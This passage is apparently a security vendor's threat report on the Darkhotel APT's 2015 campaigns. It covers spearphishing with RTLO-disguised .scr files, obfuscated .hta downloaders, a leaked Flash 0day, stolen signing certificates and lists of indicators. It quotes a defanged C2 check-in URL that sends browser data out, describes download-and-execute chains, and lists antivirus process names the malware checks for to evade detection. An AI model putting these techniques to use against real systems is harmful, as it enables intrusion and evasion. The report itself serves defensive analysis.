In 2015,\nmany of these techniques and activities remain in use. However, in addition to new variants\nof malicious .hta, we find new victims, .rar attachments with RTLO spearphishing, and the\ndeployment of a 0day from Hacking Team.\n\nThe Darkhotel APT continues to spearphish targets around the world, with a wider\ngeographic reach than its previous botnet buildout and hotel Wi-Fi attacks. Some of the\ntargets are diplomatic or have strategic commercial interests.\n\n\n-----\n\nThe location of Darkhotel s targets and victims in 2015:\n\nNorth Korea\nRussia\nSouth Korea\nJapan\nBangladesh\nThailand\nIndia\nMozambique\nGermany\n\n2015 Darkhotel .hta and backdoor-related, exploit-related and c2 sites:\n\nstoryonboard[.]net\ntisone360[.]org\nopenofficev[.]info\nsaytargetworld[.]net\nerror-page[.]net\neonlineworld[.]net\nenewsbank[.]net\nthewordusrapid[.]com\n\n2015 spearphishing incident attachment name subset:\n\nschedule(6.1~6).rar -> schedule(6.1~6)_?gpj.scr\nschedule(2.11~16).rar -> schedule(2.11~16)_?gpj.scr\ncongratulation.rar -> congratulation_?gpj.scr\nletter.rar -> letter_?gpj.scr\n\n## Consistent use of obfuscated .hta downloaders\n\nWhether the infection is achieved through spearphishing, physical access to a system or the\nHacking Team Flash 0day, there frequently seems to be a common method for a newlyinfected system to communicate with Darkhotel’s c2:\n\nA lightly obfuscated (double escaped set of javascript variable values) script maintained\nwithin an .hta file writes an executable to disk and executes it.\n\nIt is interesting that this particular group has for years now deployed backdoor and\ndownloader code in the form of .hta files. In 2010, we observed it re-purposing articles on\nNorth Korea by the US think-tank, Brookings Institute, in order to attack North Korean-related\ntargets with [malicious code buried in .hta files. It also emailed links to its malicious .hta files](http://contagiodump.blogspot.com/2010/04/apr-23-link-hta-w-trojanwin32tapaouxa.html)\n\n\n-----\n\nto North Korean tourist groups, economists with an interest in North Korea, and more. It s\nsomewhat strange to see such heavy reliance on older Windows-specific technology like\n[HTML applications, introduced by Microsoft in 1999.](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/)\n\nFrom the recent sendspace[.]servermsys[.]com/downloader.hta:\n\nAfter execution and escaping a couple of variables, the .hta uses ancient Adodb.stream\ncomponents in order to write out a string xor’d with 0x3d as an executable file and runs it.\n\nThis code results in the execution of “internet_explorer_Smart_recovery.exe”\n054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2.\nIn this case it seems that Darkhotel operators are checking as to whether or not the victim’s\n\n\n-----\n\ndefault browser is Internet Explorer, as all versions of IE return the value 0 and other\nbrowsers leave “appMinorVersion” undefined. This data collection seems somewhat odd,\nbecause .hta files are supported and run by mshta.exe on Windows systems only, still\ndelivered with Windows 8. Perhaps it is an artefact from early development of the code. Here\nis a recent version:\n\n“hxxp://sendspace[.]servermsys[.]com/readme.php?\ntype=execution&result=created_and_executed&info=” + navigator.appMinorVersion + “\n\nThe “internet_explorer_Smart_recovery.exe” file is a simple obfuscated downloader. A series\nof xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to\ndisk and executed. Later in the execution, a more complex rc4 loop decrypts the download\nurl and other strings and imports.\n\nWhen finished, this url string decryption and connectback looks like\n\nhttp://sendspace[.]servermsys[.]com/wnctprx. The file is downloaded\n(b1f56a54309147b07dda54623fecbb89) to “.tmp” file in %temp%, executed, and the\ndownloader exits. This larger file is a backdoor/downloader that includes ssh functionality,\nand drops its keys to disk for ssh interaction. We find older Darkhotel information stealers\ndropped and run on the system by these downloaders.\n\n\n-----\n\n## Spearphishing and .rar Attachments with RTLO\n\nThe Darkhotel APT will relentlessly spearphish specific targets in order to successfully\ncompromise systems. Some targets are spearphished repeatedly with much the same\nsocial-engineering schemes. For example, the attachment “schedule(2.11~16).rar” could be\nsent on February 10th, with Darkhotel returning to the same targets in late May for a second\nattempt with attachment “schedule(6.1~6).rar”.\n\nIt consistently archives RTLO .scr executable files with in .rar archives, in order to appear to\nthe target as innocuous .jpg files. These executable files are lite droppers, maintaining these\ndecoy jpeg files, and code to create an lnk downloader.\n\n\n-----\n\nWhen the target attempts to open what they think is a jpg image file, the executable code\nruns and drops a jpg image to disk, then opens it with mspaint.exe in the background. This\n“congratulations” document is in Korean, revealing a likely characteristic of the intended\ntarget.\n\n\n-----\n\nWhile the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and\nlaunches it. The shortcut maintains a multiline target shell script. This technique is also used\n[by other APTs as persistence mechanisms, as documented by our colleagues. The 64kb lnk](https://www.fireeye.com/blog/threat-research/2014/02/ground-windows-scripting-host-wsh.html)\nfile is downloader code:\n\n\n-----\n\nWhen this lnk file is executed, it begins an AJAX-based download process for the “unzip.js”\nfile (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file\nimplementing AJAX to download and execute a relatively large compiled executable:\n\n\n-----\n\nThis executable code is saved to %temp%\\csrtsrm.exe and executed there. It is a relatively\nlarge executable (~1.2 mb) that injects malicious code and spawns remote threads into\nlegitimate processes.\n\n## Stolen certificates and evasion\n\nThe group appears to maintain a stockpile of stolen certificates and deploys their\ndownloaders and the backdoors signed with them. Some of the more recent revoked\ncertificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.\n\nDarkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly\nadapted to attacking better-defended environments and prefers not to burn these stolen\ndigital certificates. In previous attacks it would simply have taken advantage of a long list of\nweakly implemented, broken certificates.\n\nNot only are its obfuscation techniques becoming stronger, but its anti-detection technology\nlist is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec)\ndecrypts a set of anti-malware strings in stages to identify defensive technologies on a\nnewly-infected system, and then opens each process, looking for a matching image name:\n\n\n-----\n\nc:\\avast! sandbox\\WINDOWS\\system32\\kernel32.dll – Avast!\navp.exe – Kaspersky Lab\nmcagent.exe;mcuicnt.exe – Intel/Mcafee\nbdagent.exe – BitDefender\nravmon.exe,ravmond.exe – Beijing Rising\n360tray.exe,360sd.exe,360rp.exe,exeMgr.exe – Qihoo 360\nayagent.aye,avguard.;avgntsd.exe – Avira Antivirus\nccsvchst.exe,nis.exe – Symantec Norton\navgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe – Avast!\nmsseces.exe;msmpeng.exe – Microsoft Security Essentials and Microsoft Anti-Malware\nService\nAVK.exe;AVKTray.exe – G-Data\navas.exe – TrustPort AV\ntptray.exe – Toshiba utility\nfsma32.exe;fsorsp.exe – F-Secure\neconser.exe;escanmon.exe – Microworld Technologies eScan\nSrvLoad.exe;PSHost.exe – Panda Software\negui.exe;ekrn.exe – ESET Smart Security\npctsSvc.exe;pctsGui.exe – PC Tools Spyware Doctor\ncasc.exe;UmxEngine.exe – CA Security Center\ncmdagent.exe;cfp.exe – Comodo\nKVSrvXP.exe;KVMonXP.exe – Jiangmin Antivirus\nnsesvc.exe;CClaw.exe – Norman\nV3Svc.exe – Ahnlab\nguardxup. – IKARUS\nFProtTray. – F-Prot\nop_mon – Agnitum Outpost\nvba332ldr.;dwengine. – DrWeb\n\nEven the identifying information that the backdoor seeks from a system is not decrypted until\nruntime. Like the “information-stealer” component documented in our previous Darkhotel\ntechnical report, this component seeks to steal a set of data with which to identify the\ninfected system. Much of the information is collected with the same set of calls, i.e.\nkernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:\n\nDefault system codepage\nNetwork adapter information\nProcessor architecture\nHostname and IP address\nWindows OS and Service Pack versions\n\nEssentially, much of this information-stealer code is the same as that observed in previous\nattacks.\n\n\n-----\n\n## Tisone360.com, Visits, and Hacking Team Flash 0day\n\nThe tisone360.com site was especially interesting to us. In April 2015, Darkhotel was emailphishing with links to earlier (cve-2014) Flash exploits, and then, at the beginning of July, it\nbegan to distribute what is reported to be a leaked Hacking Team Flash 0day.\n\nIt looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to\ntarget specific systems. We can pivot from “tisone360.com” to identify some of this activity.\nThe site was up and active as late as 22 July, 2015. However, this looks to be a small part of\nits activity. In addition to the icon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it\nlooks as though the “tisone360.com” site was delivering a Flash CVE-2014-0497 exploit in\nApril. [We reported the related vulnerability to Adobe in January 2014, when it was being](https://securelist.com/cve-2014-0497-a-0-day-vulnerability/58244/)\nused by the Darkhotel APT.\n\nRecently, the Darkhotel APT has maintained multiple working directories on this site.\n\nIt is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The\nmost interesting of these is the reported Hacking Team Flash 0day, icon.swf. In the days\nfollowing the public mention of this server, the crew slowly tightened down open access to\n/ims2/. Either way, the contents continued to be actively used.\n\nicon.swf (214709aa7c5e4e8b60759a175737bb2b) -> icon.jpg\n(42a837c4433ae6bd7490baec8aeb5091)\n-> %temp%\\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)\n\nAfter icon.jpg is downloaded by the flash exploit, it is decoded with a multi-byte xor key\n0xb369195a02. It then downloads further components.\n\nIt’s interesting to note that the group appears to be altering the compilation and linker\ntimestamps of its executable code to dates in 2013. We see this across multiple samples\ndeployed and observed for the first time in mid-2015, including the icon.jpg downloader.\n\n\n-----\n\nA log of visits to the site directory records that the directory was set up on July 8th. A handful\nof visits to a specific url on the server from five systems based in the following locations were\nrecorded on the 8th and 9th. Several of these are likely to be Darkhotel APT targets:\n\nGermany\nSouth Korea\nChina (likely to be research)\nUS\nJapan\n\nHowever, one of those systems hammered the site on the 9th, visiting almost 12,000 times in\n30 minutes. This volume of traffic is likely to represent a noisy scanning research attempt\nand not someone DoS’ing the site:\n\nRecorded site visits following the 9th are likely to be unreliable and may be more\nresearchers, responding to the growing notoriety of the site following the public reports on\nthe 9th. Many of these approximately 50 visits come from a subset of the above systems and\nare repeated multiple times. Visits from the following locations occurred on or after the 10th:\n\nGermany (likely to be research)\nUkraine (likely to be research)\nAmazon Web Services, multiple locations (likely to be research)\nGooglebot, multiple locations\nUS\nIreland (likely to be research)\nRussia\nBrazil\nChina\nFinland\nCanada\nTaiwan\nFrance (likely to be research)\n\n\n-----\n\nCzech Republic\n\n## A consistent attack flow\n\nThe Darkhotel group tends to stick with what works. For example, for years we saw repeated\nuse of spearphishing targets directly with .hta files. Now, as with the tisone360.com site\nabove, we have seen repeated use in 2015 of a creative chain of delivery sets.\n\ndownloader -> hta checkin -> info stealer -> more compiled components.\n\ndropper -> wsh script -> wsh script -> info stealer -> more compiled components\n\nspearphish -> dropper -> hta checkin -> downloader -> info stealer\n\nWhile a chain of delivery that includes obfuscated scripts within .hta files occurred as far\nback as 2011, the volume appears to have picked up in 2014 and now 2015.\n\nopenofficev[.]info (2015)\n\noffice-revision[.]com (2014)\n\nonline.newssupply[.]net (2011)\n\n## Hiding infrastructure in plain sight\n\nThe group is now more vigilant in maintaining its sites, tightening up configuration and\nresponse content. Right now, its c2 responds with anti-hero images of “Drinky Crow” from the\nalt Maakies cartoon:\n\n\n-----\n\nOther Darkhotel c2s tend to blend in with random sites on the web when incorrect or missing\npages are visited. They are ripping images either from FOTOLIA or articles on artisanal ice\ncream makers here:\n\n\n-----\n\n## Technical details\n\n### HTA md5:\n\n021685613fb739dec7303247212c3b09\n\n1ee3dfce97ab318b416c1ba7463ee405\n\n2899f4099c76232d6362fd62ab730741\n\n2dee887b20a06b8e556e878c62e46e13\n\n6b9e9b2dc97ff0b26a8a61ba95ca8ff6\n\n852a9411a949add69386a72805c8cb05\n\nbe59994b5008a0be48934a9c5771dfa5\n\ne29693ce15acd552f1a0435e2d31d6df\n\nfa67142728e40a2a4e97ccc6db919f2b\n\nfef8fda27deb3e950ba1a71968ec7466\n\n### Spearphish attachments md5:\n\n\n-----\n\n5c74db6f755555ea99b51e1c68e796f9\nc3ae70b3012cc9b5c9ceb060a251715a\n560d68c31980c26d2adab7406b61c651\nda0717899e3ccc1ba0e8d32774566219\nd965a5b3548047da27b503029440e77f\ndc0de14d9d36d13a6c8a34b2c583e70a\n39562e410bc3fb5a30aca8162b20bdd0 (first seen late 2014, used into 2015)\ne85e0365b6f77cc2e9862f987b152a89 (first seen late 2014, used into 2015)\n\n### 2015 large downloader md5:\n\n5e01b8bc78afc6ecb3376c06cbceb680\n\n61cc019c3141281073181c4ef1f4e524\n\n3d2e941ac48ae9d79380ca0f133f4a49\n\nfc78b15507e920b3ee405f843f48a7b3\n\nda360e94e60267dce08e6d47fc1fcecc\n33e278c5ba6bf1a545d45e17f7582512\n\nb1f56a54309147b07dda54623fecbb89\n\n009d85773d519a9a97129102d8116305\n\n### Infostealers dropped in 2015\n\n61637a0637fb25c53f396c305efa5dc5\n\na7e78fd4bf305509c2fc1b3706567acd\n\n### Subhosts and urls:\n\ntisone360[.]com/img_h/ims2/icon.swf\n\ntisone360[.]com/img_h/ims2/1.php\n\ntisone360[.]com/img_h/ims2/icon.jpg\n\ntisone360[.]com/noname/img/movie.swf\n\ntisone360[.]com/noname/minky/face.php\n\ntisone360[.]com/htdoc/ImageView.hta\n\ntisone360[.]com/htdoc/page1/page.html\n\ndaily[.]enewsbank[.]net/wmpsrx64\n\ndaily[.]enewsbank[.]net/newsviewer.hta\n\nsaytargetworld[.]net/season/nextpage.php\n\nsendspace[.]servermsys.com/wnctprx\n\nerror-page[.]net/update/load.php\n\nphoto[.]storyonboard[.]net/wmpsrx64\n\nphoto[.]storyonboard[.]net/photoviewer.hta\n\nphoto[.]storyonboard[.]net/readme.php\n\nunionnewsreport[.]net/aeroflot_bonus/ticket.php\n\nwww[.]openofficev[.]info/xopen88/office2\n\n\n-----\n\nwww[.]openofficev[.]info/dec98/unzip.js\nwww[.]openofficev[.]info/open99/office32\nwww[.]openofficev[.]info/decod9/unzip.js\n\n## Parallel and Previous Research\n\n[CVE-2014-0497 – A 0-day Vulnerability](https://securelist.com/cve-2014-0497-a-0-day-vulnerability/58244/)\n\n[Hacking Team Flash Zero-Day Tied To Attacks In Korea and Japan… on July 1](https://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-in-korea-and-japan-on-july-1/)\n\n[The Darkhotel APT](https://securelist.com/the-darkhotel-apt/66779/)\n\n**Read more about how you can protect your company against the Darkhotel threat**\n**actor** **[here.](https://business.kaspersky.com/darkhotel-hackingteam/4357)**\n\n[APT](https://securelist.com/tag/apt/)\n[Cyber espionage](https://securelist.com/tag/cyber-espionage/)\n[Digital Certificates](https://securelist.com/tag/digital-certificates/)\n[Spear phishing](https://securelist.com/tag/spear-phishing/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n\nAuthors\n\nGReAT\n\nDarkhotel’s attacks in 2015\n\nYour email address will not be published.
